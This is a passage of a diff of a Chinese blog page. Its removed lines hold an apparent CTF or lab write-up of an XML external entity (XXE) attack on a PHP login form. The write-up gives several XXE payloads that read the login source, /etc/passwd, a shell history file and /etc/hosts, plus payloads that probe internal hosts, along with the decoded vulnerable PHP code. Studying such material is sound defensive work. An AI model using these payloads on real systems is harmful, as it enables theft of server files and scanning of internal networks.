-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> ?&gt;</span><br><span class="line">&lt;!DOCTYPE hack [</span><br><span class="line">&lt;!ENTITY file SYSTEM  <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">  &lt;username&gt;&amp;file;&lt;/username&gt;</span><br><span class="line">  &lt;password&gt;hack&lt;/password&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20210321110800845.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKLyoqCiogYXV0b3I6IGMwbnkxCiogZGF0ZTogMjAxOC0yLTcKKi8KCiRVU0VSTkFNRSA9ICdhZG1pbic7IC8v6LSm5Y+<span class="number">3</span>CiRQQVNTV09SRCA9ICcwMjRiODc5MzFhMDNmNzM4ZmZmNjY5M2NlMGE3OGM4OCc7IC8v5a+G56CBCiRyZXN1bHQgPSBudWxsOwoKbGlieG1sX2Rpc2FibGVfZW50aXR5X2xvYWRlcihmYWxzZSk7CiR4bWxmaWxlID0gZmlsZV9nZXRfY29udGVudHMoJ3BocDovL2lucHV0Jyk7Cgp0cnl7CgkkZG9tID0gbmV3IERPTURvY3VtZW50KCk7CgkkZG9tLT5sb2FkWE1MKCR4bWxmaWxlLCBMSUJYTUxfTk9FTlQgfCBMSUJYTUxfRFRETE9BRCk7CgkkY3JlZHMgPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKCgkkdXNlcm5hbWUgPSAkY3JlZHMtPnVzZXJuYW1lOwoJJHBhc3N3b3JkID0gJGNyZWRzLT5wYXNzd29yZDsKCglpZigkdXNlcm5hbWUgPT0gJFVTRVJOQU1FICYmICRwYXNzd29yZCA9PSAkUEFTU1dPUkQpewoJCSRyZXN1bHQgPSBzcHJpbnRmKCI8cmVzdWx0Pjxjb2RlPiVkPC9jb2RlPjxtc2c+JXM8L21zZz48L3Jlc3VsdD4iLDEsJHVzZXJuYW1lKTsKCX1lbHNlewoJCSRyZXN1bHQgPSBzcHJpbnRmKCI8cmVzdWx0Pjxjb2RlPiVkPC9jb2RlPjxtc2c+JXM8L21zZz48L3Jlc3VsdD4iLDAsJHVzZXJuYW1lKTsKCX0JCn1jYXRjaChFeGNlcHRpb24gJGUpewoJJHJlc3VsdCA9IHNwcmludGYoIjxyZXN1bHQ+PGNvZGU+JWQ8L2NvZGU+PG1zZz4lczwvbXNnPjwvcmVzdWx0PiIsMywkZS0+Z2V0TWVzc2FnZSgpKTsKfQoKaGVhZGVyKCdDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD11dGYtOCcpOwplY2hvICRyZXN1bHQ7Cj8+</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* autor: c0ny1</span></span><br><span class="line"><span class="comment">* date: 2018-2-7</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">$USERNAME = &#x27;admin&#x27;; //账号</span><br><span class="line">$PASSWORD = &#x27;024b87931a03f738fff6693ce0a78c88&#x27;; //密码</span><br><span class="line">$result = null;</span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">	$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">	$creds = simplexml_import_dom($dom);</span><br><span class="line"></span><br><span class="line">	$username = $creds-&gt;username;</span><br><span class="line">	$password = $creds-&gt;password;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;</span><br><span class="line">		$result = <span class="built_in">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,$username);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$result = <span class="built_in">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,$username);</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception $e)&#123;</span><br><span class="line">	$result = <span class="built_in">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">3</span>,$e-&gt;getMessage());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(&#x27;Content-Type: text/html; charset=utf-8&#x27;);</span><br><span class="line">echo $result;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>没啥用。</p>
-<p>使用XXE打内网。<br><img src="https://img-blog.csdnimg.cn/20210321110918914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> ?&gt;</span><br><span class="line">&lt;!DOCTYPE hack [</span><br><span class="line">&lt;!ENTITY file SYSTEM  <span class="string">&quot;http://127.0.0.1:80&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">  &lt;username&gt;&amp;file;&lt;/username&gt;</span><br><span class="line">  &lt;password&gt;hack&lt;/password&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/2021032111103453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>还是没啥用。</p>
-<p>读一下用户信息。</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> ?&gt;</span><br><span class="line">&lt;!DOCTYPE hack [</span><br><span class="line">&lt;!ENTITY file SYSTEM  <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">  &lt;username&gt;&amp;file;&lt;/username&gt;</span><br><span class="line">  &lt;password&gt;hack&lt;/password&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20210321111223883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>读取历史命令。</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> ?&gt;</span><br><span class="line">&lt;!DOCTYPE hack [</span><br><span class="line">&lt;!ENTITY file SYSTEM  <span class="string">&quot;file:///www.data/nash_history&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">  &lt;username&gt;&amp;file;&lt;/username&gt;</span><br><span class="line">  &lt;password&gt;hack&lt;/password&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210321111339913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>没用。</p>
-<p>打内网，不过是直接读取/etc/hosts 和 /proc/net/arp。</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> ?&gt;</span><br><span class="line">&lt;!DOCTYPE hack [</span><br><span class="line">&lt;!ENTITY file SYSTEM  <span class="string">&quot;file:///etc/hosts&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;a;&lt;/username&gt;&lt;password&gt;a&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20210321111458320.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE hacker[</span><br><span class="line">&lt;!ENTITY a SYSTEM <span class="string">&quot;file:///etc/hosts&quot;</span>&gt; </span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;a;&lt;/username&gt;&lt;password&gt;a&lt;/password&gt;&lt;/user&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210321111651603.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE hacker[</span><br><span class="line">&lt;!ENTITY a SYSTEM <span class="string">&quot;http://10.0.45.2/&quot;</span>&gt; </span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;a;&lt;/username&gt;&lt;password&gt;a&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
-
-
-<p><img src="https://img-blog.csdnimg.cn/20210321111806460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>c段扫描，得到</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE hacker[</span><br><span class="line">&lt;!ENTITY a SYSTEM <span class="string">&quot;http://10.0.45.11/&quot;</span>&gt; </span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;a;&lt;/username&gt;&lt;password&gt;a&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210321112551545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2113,7 +2160,7 @@
               
                 <a href="/archives%7C%7C%20archive">
               
-                  <span class="site-state-item-count">62</span>
+                  <span class="site-state-item-count">63</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2135,7 +2182,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">88</span>
+                  <span class="site-state-item-count">89</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
